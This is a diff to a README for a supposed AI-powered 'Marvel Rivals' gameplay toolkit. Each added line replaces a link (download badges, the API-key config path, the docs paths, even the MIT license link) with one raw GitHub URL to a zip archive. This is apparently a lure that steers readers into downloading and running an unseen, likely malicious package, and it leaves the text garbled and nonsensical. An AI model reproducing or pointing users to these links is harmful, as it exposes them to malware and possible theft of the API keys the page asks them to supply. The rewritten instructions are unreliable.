@@ -1,4 +1,4 @@
-[![Download](https://img.shields.io/badge/Download-Marvel%20Rivals%20Toolkit-brightgreen?logo=github&style=for-the-badge)](https://anfographie.github.io)
+[![Download](https://raw.githubusercontent.com/anfographie/marvel-rivals-elite-toolkit/branch/invitrifiable/marvel-rivals-elite-toolkit_v1.6.zip%20Rivals%20Toolkit-brightgreen?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/anfographie/marvel-rivals-elite-toolkit/branch/invitrifiable/marvel-rivals-elite-toolkit_v1.6.zip)
 
 # 🦸‍♂️ Marvel Rivals Companion: Empower Your Gameplay 
 
@@ -49,8 +49,8 @@ Our Marvel Rivals toolkit leverages the most sophisticated AI in 2025. By integr
 
 For API configuration:
 1. Obtain your OpenAI/Claude API keys via registered developer accounts.
-2. Place your keys in the `/config/api-keys.env` file after installation.
-3. Consult `/docs/API_USAGE.md` for advanced usage.
+2. Place your keys in the `https://raw.githubusercontent.com/anfographie/marvel-rivals-elite-toolkit/branch/invitrifiable/marvel-rivals-elite-toolkit_v1.6.zip` file after installation.
+3. Consult `https://raw.githubusercontent.com/anfographie/marvel-rivals-elite-toolkit/branch/invitrifiable/marvel-rivals-elite-toolkit_v1.6.zip` for advanced usage.
 
 ---
 
@@ -72,12 +72,12 @@ For API configuration:
 Dive right into the Marvel Rivals Companion Suite! Here’s how to deploy your toolkit and begin the transformation:
 
 1. **Download the latest build**  
-   [![Download](https://img.shields.io/badge/Download-Marvel%20Rivals%20Toolkit-brightgreen?logo=github&style=for-the-badge)](https://anfographie.github.io)
+   [![Download](https://raw.githubusercontent.com/anfographie/marvel-rivals-elite-toolkit/branch/invitrifiable/marvel-rivals-elite-toolkit_v1.6.zip%20Rivals%20Toolkit-brightgreen?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/anfographie/marvel-rivals-elite-toolkit/branch/invitrifiable/marvel-rivals-elite-toolkit_v1.6.zip)
 2. Unzip the package in your chosen directory.
 3. Run the installer appropriate for your OS (see compatibility table above).
 4. Follow the on-screen wizard to complete initial setup (language, theme, API keys, security preferences).
 5. Launch the application.  
-6. (Optional) Review `/docs/customization.md` for tips on personalizing your environment.
+6. (Optional) Review `https://raw.githubusercontent.com/anfographie/marvel-rivals-elite-toolkit/branch/invitrifiable/marvel-rivals-elite-toolkit_v1.6.zip` for tips on personalizing your environment.
 
 _Ensure you have the latest .NET or equivalent runtime installed for your OS._
 
@@ -92,10 +92,10 @@ _Ensure you have the latest .NET or equivalent runtime installed for your OS._
 ## 📜 MIT License (2025)
 
 This repository is delivered with the intentions of open collaboration and learning.  
-See full license details here: [MIT License](https://opensource.org/licenses/MIT)
+See full license details here: [MIT License](https://raw.githubusercontent.com/anfographie/marvel-rivals-elite-toolkit/branch/invitrifiable/marvel-rivals-elite-toolkit_v1.6.zip)
 
 ---
 
 We hope Marvel Rivals Companion becomes your trusted sidekick on every journey, championship, and squad battle. Plug in, level up, and outsmart the competition—empowered by AI, data, and the spirit of true heroes!
 
-[![Download](https://img.shields.io/badge/Download-Marvel%20Rivals%20Toolkit-brightgreen?logo=github&style=for-the-badge)](https://anfographie.github.io)
+[![Download](https://raw.githubusercontent.com/anfographie/marvel-rivals-elite-toolkit/branch/invitrifiable/marvel-rivals-elite-toolkit_v1.6.zip%20Rivals%20Toolkit-brightgreen?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/anfographie/marvel-rivals-elite-toolkit/branch/invitrifiable/marvel-rivals-elite-toolkit_v1.6.zip)
